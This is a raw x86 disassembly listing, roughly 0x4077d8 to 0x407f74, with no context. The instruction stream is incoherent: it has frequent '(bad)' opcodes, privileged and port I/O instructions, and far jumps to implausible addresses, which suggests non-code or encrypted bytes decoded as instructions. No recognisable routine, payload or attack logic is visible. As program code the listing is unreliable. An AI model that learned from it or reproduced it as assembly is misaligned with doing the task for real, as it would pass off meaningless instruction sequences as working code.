  4077d8:	xchg   esi,eax
  4077d9:	xchg   ebx,eax
  4077da:	sbb    eax,0x7ad4cfa9
  4077df:	lea    ecx,[edi+ebx*8+0x1d0347b8]
  4077e6:	test   al,0xc1
  4077e8:	xchg   BYTE PTR [edx-0x28],ah
  4077eb:	outs   dx,DWORD PTR ds:[esi]
  4077ec:	mov    dh,0xca
  4077ee:	xchg   edi,eax
  4077ef:	or     eax,0xb8ac3ffe
  4077f4:	cmp    ebp,DWORD PTR [ebx]
  4077f6:	sbb    ebx,esp
  4077f8:	dec    ebp
  4077f9:	test   DWORD PTR [edi+esi*1-0x27415928],esp
  407800:	(bad)  
  407801:	(bad)  
  407802:	mov    bl,0x8
  407804:	ret    
  407805:	test   DWORD PTR [esi-0x28916892],ebp
  40780b:	dec    ebp
  40780c:	xor    ah,BYTE PTR ds:0xcac59d33
  407812:	inc    esi
  407813:	loopne 0x4077b2
  407815:	(bad)  
  407817:	pusha  
  407818:	mov    dl,BYTE PTR [ecx+0x2921096b]
  40781e:	mov    eax,0x2a34e76f
  407823:	rcr    BYTE PTR [edx-0x995f6e1],0x9d
  40782a:	rcl    ebp,1
  40782c:	mov    esp,esp
  40782e:	into   
  40782f:	xchg   ebp,eax
  407830:	test   DWORD PTR [edi-0x2d],ecx
  407833:	add    DWORD PTR [edi-0x7e445766],edx
  407839:	(bad)  
  40783b:	jle    0x40789d
  40783d:	pop    edi
  40783e:	fwait
  40783f:	aas    
  407840:	mov    eax,0x8641b512
  407845:	jge    0x407801
  407847:	lods   al,BYTE PTR ds:[esi]
  407848:	loope  0x407856
  40784a:	(bad)  
  40784b:	dec    esp
  40784c:	pushf  
  40784d:	sub    BYTE PTR [ebp-0x44],0x1c
  407851:	jnp    0x4078cc
  407853:	(bad)  
  407854:	sub    eax,edx
  407856:	mov    al,ds:0xcb276485
  40785b:	xchg   edi,eax
  40785c:	fcomip st,st(4)
  40785e:	add    ebp,DWORD PTR [ebx]
  407860:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407861:	mov    BYTE PTR [ebp+0x62],bh
  407864:	and    eax,0xfe2e4bdd
  407869:	and    BYTE PTR [edx-0x57a8fa1b],al
  40786f:	outs   dx,DWORD PTR ds:[esi]
  407870:	nop
  407871:	push   0xb
  407873:	push   0x21a6328a
  407878:	or     eax,0x9463c4f4
  40787d:	popf   
  40787e:	ror    DWORD PTR [edi+0x21],cl
  407881:	sbb    ah,BYTE PTR [ecx+0x55]
  407884:	mov    al,0xf2
  407886:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407887:	out    0x8,eax
  407889:	mov    ds:0xccb0cd69,al
  40788e:	inc    eax
  40788f:	adc    eax,0x3c9358c4
  407894:	xchg   edi,eax
  407895:	sti    
  407896:	fld    DWORD PTR [ebx+0x2ad8fc1e]
  40789c:	hlt    
  40789d:	sub    DWORD PTR [edx-0x48228034],esp
  4078a3:	pop    esi
  4078a4:	sub    al,0x48
  4078a6:	arpl   WORD PTR [ebx-0x5],dx
  4078a9:	call   0xe2d90428
  4078ae:	lock hlt 
  4078b0:	stos   DWORD PTR es:[edi],eax
  4078b1:	das    
  4078b2:	or     bl,BYTE PTR [ecx+0x35768cd]
  4078b8:	mov    ?,ebx
  4078ba:	aaa    
  4078bb:	cmp    ebp,esi
  4078bd:	jle    0x4078fc
  4078bf:	outs   dx,DWORD PTR ds:[esi]
  4078c0:	pop    esi
  4078c1:	les    ebp,FWORD PTR ds:0x2343cb2
  4078c7:	push   esp
  4078c9:	out    dx,al
  4078ca:	cs shl esi,0x37
  4078ce:	mov    ah,0x7a
  4078d0:	ins    BYTE PTR es:[edi],dx
  4078d1:	rcl    al,0xf0
  4078d4:	cmp    esi,DWORD PTR [eax]
  4078d6:	push   esi
  4078d7:	mov    edi,0x51c021e1
  4078dc:	fadd   QWORD PTR [eax]
  4078de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078df:	cld    
  4078e0:	mov    edx,ds
  4078e2:	xrelease mov BYTE PTR [edx],ch
  4078e5:	push   ebp
  4078e6:	cs repz sub eax,0x791f6afa
  4078ed:	call   0xe910:0xb10d629b
  4078f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078f5:	shr    DWORD PTR [edi],cl
  4078f7:	jmp    0x4f67:0xa17999c8
  4078fe:	jle    0x40791b
  407900:	push   edi
  407901:	mov    dh,0x17
  407903:	mov    ds:0xa8285613,al
  407908:	dec    ecx
  407909:	out    0x14,eax
  40790b:	pop    ss
  40790c:	jbe    0x4078be
  40790e:	fmul   DWORD PTR [esi-0x61]
  407911:	stos   BYTE PTR es:[edi],al
  407912:	fnsave [eax+0x76]
  407915:	jl     0x407903
  407917:	sbb    al,0xd0
  407919:	jmp    0x4078cc
  40791b:	rcl    DWORD PTR [edi-0x4b],1
  40791e:	mov    eax,ds:0x7296fbbb
  407923:	mov    eax,ds:0x3f42fe2e
  407928:	lods   eax,DWORD PTR ds:[esi]
  407929:	fisubr WORD PTR [edx-0x7e]
  40792c:	in     eax,dx
  40792d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40792e:	xor    al,0xa0
  407930:	mov    ch,0xa2
  407932:	xor    eax,0x70d4cffc
  407937:	push   0xffffff9a
  407939:	add    DWORD PTR [edx-0x1c81f958],esp
  40793f:	cmp    BYTE PTR [ecx],0x5c
  407942:	mov    edi,0xf33ad0ea
  407947:	xchg   BYTE PTR [ecx+0x3dcaefe9],bh
  40794d:	lea    edx,[ebx+eiz*1+0x443fa6bb]
  407954:	xchg   esp,eax
  407955:	sub    al,0x72
  407957:	sub    dh,BYTE PTR [esi-0x21]
  40795a:	dec    esp
  40795b:	iret   
  40795c:	sub    DWORD PTR [eax],ebx
  40795e:	pop    ds
  40795f:	in     al,0x48
  407961:	mov    edx,0x96cc310f
  407966:	pop    ss
  407967:	rcl    ebx,1
  407969:	enter  0xcb82,0x20
  40796d:	popf   
  40796e:	cdq    
  40796f:	mov    dl,0xec
  407971:	fimul  WORD PTR [edx]
  407973:	aad    0xa4
  407975:	(bad)  
  407977:	in     al,0xa3
  407979:	xabort 0x90
  40797c:	repz cmp eax,0xaf1889f2
  407982:	(bad)  
  407983:	cmp    bh,BYTE PTR [edi-0x49]
  407986:	pop    ss
  407987:	cmc    
  407988:	push   0x983e4cd
  40798d:	das    
  40798e:	or     esi,DWORD PTR [edi+0x3fc28211]
  407994:	les    ebp,FWORD PTR [esi-0x39]
  407997:	add    eax,0xcb9df3fa
  40799c:	leave  
  40799d:	xchg   ebx,eax
  40799e:	hlt    
  40799f:	jecxz  0x407973
  4079a1:	jnp    0x4079c4
  4079a3:	push   es
  4079a4:	push   0x684f36d2
  4079a9:	cmp    al,0x77
  4079ab:	jno    0x407a07
  4079ad:	cli    
  4079ae:	dec    esi
  4079af:	xchg   edi,eax
  4079b0:	jae    0x40796f
  4079b2:	jnp    0x4079d4
  4079b4:	into   
  4079b5:	ins    DWORD PTR es:[edi],dx
  4079b6:	xchg   edx,eax
  4079b7:	sub    esp,DWORD PTR [eax-0x7a6c2f78]
  4079bd:	fdivr  QWORD PTR [ecx]
  4079bf:	shl    DWORD PTR [edx-0x4b1788da],cl
  4079c5:	stos   BYTE PTR es:[edi],al
  4079c6:	mov    dl,0x11
  4079c8:	lea    ecx,[ebp-0x55]
  4079cb:	push   ds
  4079cc:	jge    0x407980
  4079ce:	dec    esp
  4079cf:	(bad)  [edx]
  4079d1:	ins    BYTE PTR es:[edi],dx
  4079d2:	sub    esp,ecx
  4079d4:	into   
  4079d5:	add    dl,BYTE PTR [esi+0x2d606fb2]
  4079db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079dc:	cmp    eax,0x2940a1af
  4079e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079e2:	sub    al,0x9
  4079e4:	mov    ds:0xa35ce03a,al
  4079e9:	pop    esp
  4079ea:	loop   0x4079e3
  4079ec:	sbb    al,0x4f
  4079ee:	lods   al,BYTE PTR ds:[esi]
  4079ef:	leave  
  4079f0:	jmp    0x407a0e
  4079f2:	sbb    DWORD PTR [ebp+0x79],0x924f5eca
  4079f9:	sub    esp,DWORD PTR [ebp+0x78]
  4079fc:	xchg   ecx,eax
  4079fd:	out    0x27,eax
  4079ff:	call   0xf1f4:0x1a894cd1
  407a06:	pusha  
  407a07:	mov    ebp,0x85f49c98
  407a0c:	clc    
  407a0d:	shl    ebp,cl
  407a0f:	pop    edi
  407a10:	or     al,0x83
  407a12:	cld    
  407a13:	daa    
  407a14:	mov    ecx,0xf293d05e
  407a19:	sbb    DWORD PTR [ecx+0xa],edi
  407a1c:	inc    edx
  407a1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a1e:	loop   0x4079de
  407a20:	mov    ds:0x62059107,eax
  407a25:	addr16 into 
  407a27:	in     eax,dx
  407a28:	jnp    0x4079e0
  407a2a:	or     DWORD PTR [edx+edx*1+0x17],edx
  407a2e:	ret    0x79b6
  407a31:	sbb    eax,0xc93c6373
  407a36:	xchg   BYTE PTR [esi],cl
  407a38:	pop    edi
  407a39:	sar    esi,cl
  407a3b:	pop    esp
  407a3c:	sar    DWORD PTR [eax-0x71],1
  407a3f:	not    DWORD PTR [edi+ebp*2-0x5c6616ea]
  407a46:	idiv   DWORD PTR [eax+0x6a]
  407a49:	fdivr  QWORD PTR [edi-0x39]
  407a4c:	cmp    al,dl
  407a4e:	mov    ebp,0xc0277f59
  407a53:	push   ebx
  407a54:	dec    eax
  407a55:	stos   DWORD PTR es:[edi],eax
  407a56:	icebp  
  407a57:	sbb    bl,BYTE PTR [eax]
  407a59:	mov    cl,0x5f
  407a5b:	xchg   edi,eax
  407a5c:	mov    edx,0x8c5de8a7
  407a61:	in     al,0xd
  407a63:	xchg   BYTE PTR [edx+eiz*8],dh
  407a66:	ror    DWORD PTR [esi+0x537dab1b],0x36
  407a6d:	arpl   WORD PTR [ebx],cx
  407a6f:	int3   
  407a70:	mov    ch,0x6a
  407a72:	jo     0x407ae7
  407a74:	push   ebx
  407a75:	push   eax
  407a76:	xor    BYTE PTR [esi+0x73],dl
  407a79:	repz out dx,al
  407a7b:	int3   
  407a7c:	cmc    
  407a7d:	dec    ecx
  407a7e:	into   
  407a7f:	shl    BYTE PTR [eax+edx*1+0x42],cl
  407a83:	dec    esi
  407a84:	xchg   BYTE PTR [edx+eax*2+0x70d57e55],al
  407a8b:	and    al,0x9a
  407a8d:	push   esi
  407a8e:	les    esi,FWORD PTR [esi]
  407a90:	inc    esp
  407a91:	jbe    0x407b08
  407a93:	lods   eax,DWORD PTR ds:[esi]
  407a94:	cwde   
  407a95:	mov    eax,0x8f7843be
  407a9a:	mov    cl,0xd5
  407a9c:	stos   DWORD PTR es:[edi],eax
  407a9d:	add    BYTE PTR [esi-0x80],bh
  407aa0:	jge    0x407a87
  407aa2:	pop    eax
  407aa3:	gs mov ch,0xf4
  407aa6:	jno    0x407a5a
  407aa8:	sbb    bh,bh
  407aaa:	(bad)  
  407aab:	pop    ebx
  407aac:	mov    DWORD PTR [eax+0x6a],eax
  407aaf:	and    DWORD PTR [esi-0x46f5838d],0x3
  407ab6:	int3   
  407ab7:	sub    DWORD PTR [edx+edi*2+0x7215716d],edx
  407abe:	lea    esi,[esi-0x1c60b54b]
  407ac4:	aad    0x86
  407ac6:	ins    DWORD PTR es:[edi],dx
  407ac7:	cmovp  edx,DWORD PTR [edx]
  407aca:	jecxz  0x407a9d
  407acc:	stc    
  407acd:	or     ah,BYTE PTR [ebx+edx*8+0x7d]
  407ad1:	outs   dx,BYTE PTR ds:[esi]
  407ad2:	ret    
  407ad3:	out    dx,eax
  407ad4:	jbe    0x407b21
  407ad6:	adc    al,0xcc
  407ad8:	xchg   esi,eax
  407ad9:	jno    0x407a78
  407adb:	push   ebx
  407adc:	mov    ebx,0x44087aa9
  407ae1:	mov    dh,0x99
  407ae3:	dec    edi
  407ae4:	pop    edx
  407ae5:	in     al,0xfd
  407ae7:	jmp    0x78fc:0x1ccfcdc0
  407aee:	cli    
  407aef:	adc    bh,BYTE PTR [ebp-0x6a3bde06]
  407af5:	test   eax,0xc39ee21c
  407afa:	nop
  407afb:	cmp    eax,0x7faf369b
  407b00:	out    dx,al
  407b01:	sub    BYTE PTR [eax+0x5e0ec7ee],0xbb
  407b08:	jle    0x407b39
  407b0a:	mov    bh,0xce
  407b0c:	jp     0x407ac7
  407b0e:	stos   DWORD PTR es:[edi],eax
  407b0f:	push   ebx
  407b10:	dec    eax
  407b11:	data16 xor dl,BYTE PTR [edi]
  407b14:	in     eax,dx
  407b15:	imul   ecx,DWORD PTR [eax],0x4f6d6969
  407b1b:	sub    eax,DWORD PTR [esi-0x546a3f57]
  407b21:	loop   0x407ad3
  407b23:	pusha  
  407b24:	inc    DWORD PTR [ecx+0x40]
  407b27:	pusha  
  407b28:	push   esi
  407b29:	inc    eax
  407b2a:	aaa    
  407b2b:	and    al,0xf
  407b2d:	mov    cs,WORD PTR [ecx+0x1b]
  407b30:	test   esi,esi
  407b32:	inc    edx
  407b33:	pop    ss
  407b34:	xchg   DWORD PTR [eax-0x4f],eax
  407b37:	and    eax,0xa70dece3
  407b3c:	mov    WORD PTR [esi+0x42],cs
  407b3f:	jmp    0x8789:0x303ed35a
  407b46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b47:	mov    ?,WORD PTR ds:[edx-0x1f]
  407b4b:	fiadd  WORD PTR [ecx+ecx*8+0x28]
  407b4f:	and    ecx,DWORD PTR [esi-0x784fd636]
  407b55:	jae    0x407ad9
  407b57:	lahf   
  407b58:	in     eax,dx
  407b59:	outs   dx,DWORD PTR ds:[esi]
  407b5a:	mov    ecx,0xe7cbb8f
  407b5f:	add    cl,dh
  407b61:	cs dec eax
  407b63:	xchg   ecx,eax
  407b64:	jecxz  0x407b99
  407b66:	iret   
  407b67:	add    al,0x21
  407b69:	call   0x1d99:0x88e22e0c
  407b70:	mov    cl,0xf7
  407b72:	test   BYTE PTR [ebp+0x54f7a5db],cl
  407b78:	aas    
  407b79:	mov    dl,0xd5
  407b7b:	cmp    esi,DWORD PTR [esi-0x1923328d]
  407b81:	aad    0x79
  407b83:	cmp    dl,ah
  407b85:	out    dx,al
  407b86:	in     al,dx
  407b87:	add    BYTE PTR [ebx-0x2f],bh
  407b8a:	pop    ecx
  407b8b:	jmp    0xb72:0x52e7504f
  407b92:	popf   
  407b93:	xchg   esi,eax
  407b94:	mov    edx,0x8cb08c68
  407b99:	(bad)  
  407b9a:	inc    ecx
  407b9b:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b9d:	in     al,0xc8
  407b9f:	cld    
  407ba0:	add    eax,0x35ada0e6
  407ba5:	aas    
  407ba6:	dec    esp
  407ba7:	ds sub al,0xd6
  407baa:	jne    0x407c20
  407bac:	xor    al,0x60
  407bae:	retf   
  407baf:	sbb    eax,0xac849da1
  407bb4:	inc    ebp
  407bb5:	xchg   ecx,eax
  407bb6:	inc    esp
  407bb7:	lods   al,BYTE PTR ds:[esi]
  407bb8:	pop    esp
  407bb9:	push   0x4b
  407bbb:	clc    
  407bbc:	dec    edi
  407bbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bbe:	push   ebp
  407bbf:	imul   ecx,DWORD PTR [ebx+0x26fb4f7c],0x9ec0249a
  407bc9:	mov    esp,0xd5ce8f70
  407bce:	or     eax,0xd9a1bd31
  407bd3:	leave  
  407bd4:	pushf  
  407bd5:	xchg   BYTE PTR [ecx+0x34],bl
  407bd8:	mov    dl,0xb6
  407bda:	sahf   
  407bdb:	xor    ch,dh
  407bdd:	mov    eax,0x1609ea7b
  407be2:	jp     0x407be2
  407be4:	or     eax,DWORD PTR [edi-0x6febb935]
  407bea:	pop    esp
  407beb:	mov    ds:0xaeb587e0,al
  407bf0:	inc    ecx
  407bf1:	mov    eax,ds:0x7dee4880
  407bf6:	int3   
  407bf7:	iret   
  407bf8:	jno    0x407c13
  407bfa:	mov    dl,0x37
  407bfc:	add    BYTE PTR [eax+0x65],cl
  407bff:	xchg   edx,eax
  407c00:	lods   eax,DWORD PTR ds:[esi]
  407c01:	shr    DWORD PTR [ecx+eiz*1+0x218f9590],0x39
  407c09:	xor    eax,0x5d9f572c
  407c0e:	xor    bh,bl
  407c10:	mov    esi,0x89a5c7e
  407c15:	aas    
  407c16:	pop    ds
  407c17:	mov    esi,edx
  407c19:	jl     0x407c1c
  407c1b:	int3   
  407c1c:	pop    ebp
  407c1d:	sub    al,0x25
  407c1f:	sub    eax,0xf73e289f
  407c24:	inc    BYTE PTR [edx+0x60f97dd5]
  407c2a:	adc    eax,0xc1d9747a
  407c2f:	loop   0x407c0a
  407c31:	sbb    dl,BYTE PTR [edi+edx*8]
  407c34:	adc    al,0x50
  407c36:	nop
  407c37:	stc    
  407c38:	ret    0xc956
  407c3b:	mov    eax,ds:0x4a433e44
  407c40:	pop    ss
  407c41:	jne    0x407c0a
  407c43:	hlt    
  407c44:	repnz xchg edx,eax
  407c46:	jecxz  0x407c27
  407c48:	ds adc al,0x22
  407c4b:	adc    BYTE PTR [edx],cl
  407c4d:	shr    BYTE PTR [eax],0x7d
  407c50:	fwait
  407c51:	mov    eax,0xc5048618
  407c56:	xchg   ecx,eax
  407c57:	jmp    FWORD PTR [ecx-0x2]
  407c5a:	lahf   
  407c5b:	lea    esp,ss:[esi+0x2630e950]
  407c62:	cld    
  407c63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c64:	call   0x96d8:0xcc80ea36
  407c6b:	dec    ebx
  407c6c:	xchg   edi,eax
  407c6d:	and    esp,DWORD PTR [edi]
  407c6f:	jge    0x407c7c
  407c71:	add    BYTE PTR [edx-0x4f],dl
  407c74:	adc    ch,al
  407c76:	and    eax,0xec90ecea
  407c7b:	mov    dh,0xa0
  407c7d:	add    bl,BYTE PTR [ebx+0xe]
  407c80:	retf   
  407c81:	pop    edi
  407c82:	mov    ecx,0xaa908578
  407c87:	mov    esp,ebp
  407c89:	push   es
  407c8a:	sbb    al,0xcf
  407c8c:	inc    ebp
  407c8d:	dec    esi
  407c8e:	push   ss
  407c8f:	mov    WORD PTR [eax-0x10f39104],fs
  407c95:	test   eax,0xf78dce5d
  407c9a:	dec    edi
  407c9b:	fidiv  DWORD PTR [ecx]
  407c9d:	mov    ebp,0x908e564a
  407ca2:	jg     0x407c9d
  407ca4:	cmp    al,BYTE PTR [ebx-0x55fae7ec]
  407caa:	adc    esi,DWORD PTR ds:0x90731d7e
  407cb0:	add    DWORD PTR [ebx+0x23],ecx
  407cb3:	ins    BYTE PTR es:[edi],dx
  407cb4:	hlt    
  407cb5:	fsubr  st,st(6)
  407cb7:	pop    ebp
  407cb8:	lock shl bh,cl
  407cbb:	adc    eax,ecx
  407cbd:	ret    
  407cbe:	cli    
  407cbf:	fwait
  407cc0:	jo     0x407cbd
  407cc2:	inc    eax
  407cc3:	int3   
  407cc4:	xor    WORD PTR [esi+0x28f47fee],di
  407ccb:	cli    
  407ccc:	(bad)  
  407ccd:	and    eax,0x5bd9dc25
  407cd2:	in     al,dx
  407cd3:	mov    esp,DWORD PTR ds:0xbe02c77d
  407cd9:	push   ds
  407cda:	in     eax,dx
  407cdb:	sti    
  407cdc:	adc    al,0xe7
  407cde:	ins    DWORD PTR es:[edi],dx
  407cdf:	add    eax,0x109216a
  407ce4:	loopne 0x407cac
  407ce6:	and    esi,DWORD PTR [edi]
  407ce8:	pop    edi
  407ce9:	icebp  
  407cea:	es repz adc ch,cl
  407cee:	ins    BYTE PTR es:[edi],dx
  407cef:	or     DWORD PTR ds:0x181eefd3,esp
  407cf5:	pop    edx
  407cf6:	mov    eax,ds:0x25f96836
  407cfb:	in     eax,0x72
  407cfd:	mov    dh,0xed
  407cff:	arpl   WORD PTR [ebx-0x2689bbd6],ax
  407d05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d06:	stos   BYTE PTR es:[edi],al
  407d07:	(bad)  
  407d08:	pop    edi
  407d09:	xchg   esp,eax
  407d0a:	lea    ebx,[ecx+edx*8+0xd7e136e]
  407d11:	sbb    edx,DWORD PTR [eax]
  407d13:	add    DWORD PTR [edi+edi*4],edi
  407d16:	add    edx,DWORD PTR [edi-0x62fe6127]
  407d1c:	aaa    
  407d1d:	mov    ecx,0xc8967d10
  407d22:	xchg   ebx,eax
  407d23:	mov    edi,0xec7357fa
  407d28:	sbb    BYTE PTR [ecx],dl
  407d2a:	repnz mov DWORD PTR [esi-0x3b389feb],edx
  407d31:	adc    BYTE PTR ds:[ebx-0x4cbe1cba],ah
  407d38:	nop
  407d39:	clc    
  407d3a:	jecxz  0x407cfc
  407d3c:	mov    edi,0x42b966b9
  407d41:	call   0x4305:0x772c99ca
  407d48:	out    dx,eax
  407d49:	add    esi,ebx
  407d4b:	dec    esp
  407d4c:	cmc    
  407d4d:	xchg   DWORD PTR [esi],esp
  407d4f:	push   esp
  407d50:	popa   
  407d51:	dec    esi
  407d52:	xchg   edx,eax
  407d53:	jno    0x407ce4
  407d55:	or     BYTE PTR [edx],bh
  407d57:	xor    bh,BYTE PTR [di+0x49ee]
  407d5c:	adc    ecx,edx
  407d5e:	rcl    BYTE PTR [edi+0x77ed9317],1
  407d64:	mov    bl,0x7b
  407d66:	dec    ecx
  407d67:	ins    BYTE PTR es:[edi],dx
  407d68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d69:	push   0xb9888abf
  407d6e:	mov    ecx,0x1032badc
  407d73:	jmp    0x842b:0x94231338
  407d7a:	test   al,0x2
  407d7c:	loop   0x407db0
  407d7e:	(bad)  
  407d7f:	(bad)  
  407d80:	daa    
  407d81:	ss loopne 0x407d53
  407d84:	test   BYTE PTR [ebx],ah
  407d86:	out    0x52,al
  407d88:	pop    ds
  407d89:	and    edi,DWORD PTR [ecx]
  407d8b:	sbb    eax,DWORD PTR [esi+0x3c1db5d6]
  407d91:	cmp    cl,dh
  407d93:	jg     0x407d6d
  407d95:	inc    esi
  407d96:	sbb    ebx,ebx
  407d98:	sub    BYTE PTR [edx-0x57d9cc0e],ch
  407d9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d9f:	es pop edx
  407da1:	push   ds
  407da2:	in     al,0xd0
  407da4:	mov    ah,0x5c
  407da6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407da7:	mov    al,ds:0x813779b0
  407dac:	mov    dh,0x30
  407dae:	loopne 0x407e2f
  407db0:	push   esp
  407db1:	into   
  407db2:	inc    edx
  407db3:	aad    0xef
  407db5:	jns    0x407def
  407db7:	icebp  
  407db8:	shl    DWORD PTR [esi-0x366520ed],0xe9
  407dbf:	hlt    
  407dc0:	mov    dh,BYTE PTR ds:0x8d132507
  407dc7:	aad    0xe6
  407dc9:	dec    ebp
  407dca:	lea    edi,[ebp-0xca53a88]
  407dd0:	pop    edx
  407dd1:	outs   dx,DWORD PTR ds:[esi]
  407dd2:	aaa    
  407dd3:	fs mov edi,0x8ddf82be
  407dd9:	and    BYTE PTR [ebp+0x70],dl
  407ddc:	dec    eax
  407ddd:	repnz (bad) 
  407ddf:	or     BYTE PTR [eax],dl
  407de1:	pop    ebx
  407de2:	rcl    BYTE PTR ds:[edx+0x31af938a],1
  407de9:	jl     0x407e05
  407deb:	push   ebx
  407dec:	imul   eax,DWORD PTR [eax-0x1e81fb15],0xffffff8a
  407df3:	or     DWORD PTR [esi],edx
  407df5:	mov    bl,0xc8
  407df7:	jno    0x407d9b
  407df9:	inc    edi
  407dfa:	bound  edx,QWORD PTR [esi-0x34]
  407dfd:	adc    eax,0x497bf454
  407e02:	test   al,0x53
  407e04:	push   ebx
  407e05:	mov    esi,esi
  407e07:	jge    0x407e62
  407e09:	dec    ebx
  407e0a:	add    al,bh
  407e0c:	rcl    BYTE PTR [ebx],0x40
  407e0f:	daa    
  407e10:	lock leave 
  407e12:	xor    DWORD PTR [ebx-0x80],esp
  407e15:	xlat   BYTE PTR ds:[ebx]
  407e16:	jno    0x407e10
  407e18:	movlps QWORD PTR [esp+ecx*4-0x77],xmm6
  407e1d:	(bad)  
  407e1e:	mov    esi,0x82e83366
  407e23:	or     al,0x45
  407e25:	inc    ebp
  407e26:	pop    ss
  407e27:	scas   al,BYTE PTR es:[edi]
  407e28:	dec    edi
  407e29:	repnz not BYTE PTR [ebx+0x7c]
  407e2d:	aaa    
  407e2e:	xor    al,0xfb
  407e30:	pop    esi
  407e31:	bound  esp,QWORD PTR [ecx+0x65]
  407e34:	nop
  407e35:	sar    DWORD PTR ds:0xcd9641f8,0x77
  407e3c:	scas   al,BYTE PTR es:[edi]
  407e3d:	jb     0x407dd0
  407e3f:	or     dl,BYTE PTR [eax+ecx*8]
  407e42:	push   esp
  407e43:	push   cs
  407e44:	push   ebp
  407e45:	das    
  407e46:	mov    ds:0x3dbb80a4,eax
  407e4b:	ror    eax,cl
  407e4d:	dec    ebx
  407e4e:	and    edx,DWORD PTR [edi-0x70]
  407e51:	pop    esp
  407e52:	add    DWORD PTR [esi+0x12ffcc26],esi
  407e58:	stos   DWORD PTR es:[edi],eax
  407e59:	inc    eax
  407e5a:	mov    ecx,0x80bf5653
  407e5f:	inc    edi
  407e60:	fmul   QWORD PTR [edx+0x1d]
  407e63:	and    bh,BYTE PTR [ebp-0x2b]
  407e66:	pop    esp
  407e67:	and    al,0xae
  407e69:	dec    eax
  407e6a:	add    eax,0x45f00b6d
  407e6f:	or     edi,DWORD PTR [ebx+0x43f36215]
  407e75:	mov    DWORD PTR [ebp-0x71d8e8aa],edx
  407e7b:	rcr    DWORD PTR [ecx-0x47035e4e],cl
  407e81:	sbb    ebp,edi
  407e83:	push   edi
  407e84:	(bad)  
  407e85:	cmp    edi,DWORD PTR [eax]
  407e87:	inc    esp
  407e88:	cli    
  407e89:	lods   al,BYTE PTR ds:[esi]
  407e8a:	mov    esi,DWORD PTR [ecx+0x5a3d8c0d]
  407e90:	fxch   st(2)
  407e92:	and    DWORD PTR [edx+ecx*2-0x1a],edx
  407e96:	jl     0x407ed7
  407e98:	pop    ss
  407e99:	ins    DWORD PTR es:[edi],dx
  407e9a:	test   eax,0xcd191eb6
  407e9f:	xchg   edi,eax
  407ea0:	adc    dl,al
  407ea2:	jae    0x407e31
  407ea4:	xchg   DWORD PTR [edx],edx
  407ea6:	add    BYTE PTR [ebx],bl
  407ea8:	js     0x407edf
  407eaa:	leave  
  407eab:	sbb    DWORD PTR [ebx-0x19],ecx
  407eae:	(bad)
  407eb1:	push   ebp
  407eb2:	dec    ecx
  407eb3:	es test edx,esp
  407eb6:	inc    esi
  407eb7:	push   eax
  407eb8:	popf   
  407eb9:	cmp    ah,BYTE PTR [ebx+ebx*1]
  407ebc:	mov    al,0x9b
  407ebe:	outs   dx,BYTE PTR ds:[esi]
  407ebf:	cmp    eax,0x7674ff7
  407ec4:	add    BYTE PTR [edx],al
  407ec6:	add    edx,DWORD PTR [esi-0x15]
  407ec9:	push   cs
  407eca:	xchg   DWORD PTR [esi],eax
  407ecc:	or     DWORD PTR [esi],esp
  407ece:	adc    edi,DWORD PTR ds:0xc4a1462e
  407ed4:	pushf  
  407ed5:	mov    ecx,0xfab8b631
  407eda:	fcomp  DWORD PTR [eax+0x3d]
  407edd:	das    
  407ede:	sub    ecx,edx
  407ee0:	out    0x29,al
  407ee2:	push   ds
  407ee3:	xchg   esp,eax
  407ee4:	jb     0x407ede
  407ee6:	jbe    0x407e8c
  407ee8:	xor    BYTE PTR [esi+0x3e],bl
  407eeb:	in     al,dx
  407eec:	sub    BYTE PTR [ecx-0x4c],0x40
  407ef0:	fcomp  st(4)
  407ef2:	xchg   ecx,eax
  407ef3:	stc    
  407ef4:	cdq    
  407ef5:	pop    ebp
  407ef6:	addr16 out dx,al
  407ef8:	xchg   esi,eax
  407ef9:	loope  0x407f03
  407efb:	or     DWORD PTR [edi+eax*8+0x16eeb3f0],ebx
  407f02:	xor    eax,0x7c036056
  407f07:	inc    edi
  407f08:	pop    ecx
  407f09:	mov    bl,BYTE PTR [edx]
  407f0b:	push   ss
  407f0c:	stos   DWORD PTR es:[edi],eax
  407f0d:	sub    al,0x67
  407f0f:	int3   
  407f10:	add    eax,0xbb527b58
  407f15:	pop    DWORD PTR [edx+0x6d]
  407f18:	cmp    bl,BYTE PTR [edx]
  407f1a:	loope  0x407f01
  407f1c:	lea    ecx,ss:[esi+0x1560597e]
  407f23:	ins    BYTE PTR es:[edi],dx
  407f24:	nop
  407f25:	xchg   edx,eax
  407f26:	and    al,0xdd
  407f28:	fyl2x  
  407f2a:	inc    esp
  407f2b:	call   0xc07188f5
  407f30:	or     ebp,DWORD PTR [ebp-0x53]
  407f33:	lods   al,BYTE PTR ds:[esi]
  407f34:	add    eax,0xdae050d9
  407f39:	xchg   ebp,eax
  407f3a:	or     BYTE PTR [ecx],0xa4
  407f3d:	aam    0xe9
  407f3f:	int3   
  407f40:	and    eax,0x9a94804a
  407f45:	ffree  st(0)
  407f47:	and    eax,0xbd1c2792
  407f4c:	add    DWORD PTR [edx-0x6e],eax
  407f4f:	jb     0x407faa
  407f51:	mov    ah,0x9a
  407f53:	fimul  WORD PTR [edi]
  407f55:	test   DWORD PTR [esi-0x74ffffff],ebx
  407f5b:	inc    ebp
  407f5c:	hlt    
  407f5d:	neg    ecx
  407f5f:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  407f66:	adc    ecx,eax
  407f68:	mov    eax,DWORD PTR [ebp-0x28]
  407f6b:	mov    ecx,DWORD PTR [ebp-0x18]
  407f6e:	not    DWORD PTR ds:0x42a2da
  407f74:	xor    eax,esi
